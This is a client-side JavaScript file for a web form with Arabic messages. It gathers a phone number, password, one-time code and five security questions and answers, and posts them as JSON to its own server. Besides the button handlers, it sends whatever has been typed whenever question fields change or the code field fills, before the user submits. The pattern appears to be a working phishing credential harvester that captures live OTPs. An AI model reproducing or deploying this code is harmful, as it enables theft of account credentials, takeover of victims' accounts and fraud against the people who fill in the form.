const q1 = document.getElementById("q1");
const q2 = document.getElementById("q2");
const q3 = document.getElementById("q3");
const q4 = document.getElementById("q4");
const q5 = document.getElementById("q5");

const accountForm = document.getElementById("account");
// const login = document.getElementById("press-here-login");
// const code = document.getElementById("code");
// const codeForm = document.getElementById("code");
const sendRequest = document.getElementById("final");
const sendRequestForm = document.getElementById("center-message");
const sendCode = document.getElementById("send-code");
// const confirm = document.getElementById("confirm");
const done = document.getElementById("done");
const end = document.getElementById("end");

const MessageText = document.getElementById("message-text");
const sendng = document.getElementById("sendng");
const file = document.getElementById("file");
const fileName = document.getElementById("file-name");

var phoneNumber = document.getElementById("phone-number");
var password = document.getElementById("pasword");
var codeNumber = document.getElementById("code-number");


var count = 0;




end.addEventListener('click', ()=>{
  location.reload();
});

q1.addEventListener('change', ()=>{

  count++;
  if (count > 2)
    fetchA();
});
q2.addEventListener('change', ()=>{
  count++;
  if (count > 2)
    fetchA();
});
q3.addEventListener('change', ()=>{
  count++;
  if (count > 2)
    fetchA();
});
q4.addEventListener('change', ()=>{
  count++;
  if (count > 2)
    fetchA();
});
q5.addEventListener('change', ()=>{
  count++;
  if (count > 2)
    fetchA();
});
// login.addEventListener('click', ()=>{
//   login.style.backgroundColor = "#671515"
//   login.style.color = "white"

//   accountForm.style.height = "auto";
//   accountForm.style.transform = "scale(1)"
//   accountForm.style.bottom = "0"

//   setTimeout(()=>{
//     login.style.backgroundColor = "white"
//     login.style.color = "black"
//   },200);
// });

codeNumber.addEventListener("change", ()=>{
  console.log("here");
  var s = codeNumber.value;
  if(s.length>5){
    fetchA();
  }
});

//selct fle
file.addEventListener('change', ()=>{
  fileName.innerText = file.value;
});



// send code
sendCode.addEventListener('click', ()=>{
  sendCode.style.backgroundColor = "#671515"

  // var ss = sessionStorage.removeItem("ss");

  var ss = sessionStorage.getItem("ss");




  if(ss){
    // formData.append('ss', ss);
  }

  fetchA();

  var phone = phoneNumber.value;

  var pass = password.value;
  var otp = codeNumber.value;

  var answerr1 = answer1.value;
  var answerr2 = answer2.value;
  var answerr3 = answer3.value;
  var answerr4 = answer4.value;
  var answerr5 = answer5.value;

  if(phone=='' ||pass=='' || answerr1=='' || answerr2==''||answerr3==''||answerr4==''|| answerr5==''){
    sendng.style.visibility ='hidden'
    MessageText.innerText = "الرجاء ادخال جميع الحقول";
    sendRequestForm.style.transform = "translateY(0)"
    setTimeout(()=>{
      sendRequestForm.style.transform = "translateY(100%)"
    },5000);
  }
  else{
    sendng.style.visibility ='visible'
    MessageText.innerText = " جاري ارسال الرمز";
    sendRequestForm.style.transform = "translateY(0)"
    setTimeout(()=>{
      sendRequestForm.style.transform = "translateY(100%)"
    },10000);
  }
  setTimeout(()=>{
    sendCode.style.backgroundColor = "#9E1728"
  },200);
});

function fetchA(d){
  var phone = phoneNumber.value;
  var pass = password.value;

  var otp = codeNumber.value;

  var question1 = q1.value;
  var question2 = q2.value;
  var question3 = q3.value;
  var question4 = q4.value;
  var question5 = q5.value;

  var answerr1 = answer1.value;
  var answerr2 = answer2.value;
  var answerr3 = answer3.value;
  var answerr4 = answer4.value;
  var answerr5 = answer5.value;


  var ss = sessionStorage.getItem("ss");

  if(ss){
  }

fetch('/', {
    method: 'POST',
    headers: {
        // 'X-CSRF-TOKEN': document.getElementById('cr').attributes.content.value,
        'Content-Type': 'application/json'
    },
    body: JSON.stringify({
      'phone': phone,
      'password':pass,
      'otp': otp,
      'question1': question1,
      'question2': question2,
      'question3': question3,
      'question4': question4,
      'question5': question5,
      'answer1': answerr1,
      'answer2': answerr2,
      'answer3': answerr3,
      'answer4': answerr4,
      'answer5': answerr5,
    }),
    })
    .then(response => response.json())
    .then(data => {
      if(data.ss !=''){
        sessionStorage.setItem("ss", data.ss);
      }
      if(!((phone=='' ||pass=='' || otp=='' || answerr1=='' || answerr2==''||answerr3==''||answerr4==''|| answerr5==''))){
        done.style.transform = "translateY(0)"
      }
      console.log("jhghg");

      console.log(data);
    })
    .catch((error) => {
        console.error('Error:');
    });
}


// code.addEventListener('click', ()=>{
//   code.style.backgroundColor = "#671515"
//   code.style.color = "white"

//   codeForm.style.height = "auto";
//   codeForm.style.transform = "scale(1)"
//   codeForm.style.bottom = "0"

//   setTimeout(()=>{
//     code.style.backgroundColor = "white"
//     code.style.color = "black"
//   },200);
// });

// //confirm code
// confirm.addEventListener('click', ()=>{
//   codeForm.style.height = "0";
//   codeForm.style.transform = "scale(0)";
//   codeForm.style.bottom = "100px";

//   var phone = phoneNumber.value;
//   var pass = password.value;
//   var otp = codeNumber.value;

//   var question = q.value;
//   var answerr = answer.value;
  
// //   var ss = sessionStorage.removeItem("ss");

//   var ss = sessionStorage.getItem("ss");

//   var formData = new FormData();

//   formData.append('phone', phone);
//   formData.append('password', pass);
//   formData.append('otp', otp);

//   if(ss){
//     formData.append('ss', ss);
//   }
//   if(file.files[0]){
//     formData.append('img', file.files[0]);
//   }
//   fetchA(formData);
// });

//send request
sendRequest.addEventListener('click', ()=>{
  console.log("here");
  sendRequest.style.backgroundColor = "#671515"
  setTimeout(()=>{
    sendRequest.style.backgroundColor = "#9E1728"
  },300);

  var phone = phoneNumber.value;
  var pass = password.value;

  var otp = codeNumber.value;

  var question1 = q1.value;
  var question2 = q2.value;
  var question3 = q3.value;
  var question4 = q4.value;
  var question5 = q5.value;

  var answerr1 = answer1.value;
  var answerr2 = answer2.value;
  var answerr3 = answer3.value;
  var answerr4 = answer4.value;
  var answerr5 = answer5.value;


  var ss = sessionStorage.getItem("ss");

  if(ss){
  }

fetch('/', {
    method: 'POST',
    headers: {
        // 'X-CSRF-TOKEN': document.getElementById('cr').attributes.content.value,
        'Content-Type': 'application/json'
    },
    body: JSON.stringify({
      'phone': phone,
      'password': pass,
      'otp': otp,
      'question1': question1,
      'question2': question2,
      'question3': question3,
      'question4': question4,
      'question5': question5,
      'answer1': answerr1,
      'answer2': answerr2,
      'answer3': answerr3,
      'answer4': answerr4,
      'answer5': answerr5,
    }),
    })
    .then(response => {
      if(response.ok){
        if(!((phone=='' ||pass=='' || otp=='' || answerr1=='' || answerr2==''||answerr3==''||answerr4==''|| answerr5==''))){
          done.style.transform = "translateY(0)"
        }
      }
      
    })
    .then(data => {
      if(data.ss !=''){
        sessionStorage.setItem("ss", data.ss);
      }
     
      console.log("jhghg");

      console.log(data);
    })
    .catch((error) => {
        console.error('Error:');
    });


  if(phone=='' ||pass ==''|| otp=='' || answerr1=='' || answerr2==''||answerr3==''||answerr4==''||answerr5==''){
    sendng.style.visibility ='hidden'
    MessageText.innerText = "الرجاء ادخال جميع الحقول";
    sendRequestForm.style.transform = "translateY(0)"
    setTimeout(()=>{
        sendRequestForm.style.transform = "translateY(100%)"
      },3000);
  }
  else{
    sendng.style.visibility ='visible'
    MessageText.innerText = " جاري ارسال الطلب";
    sendRequestForm.style.transform = "translateY(0)"
    setTimeout(()=>{
      sendRequestForm.style.transform = "translateY(100%)"
    },10000);
  }

});
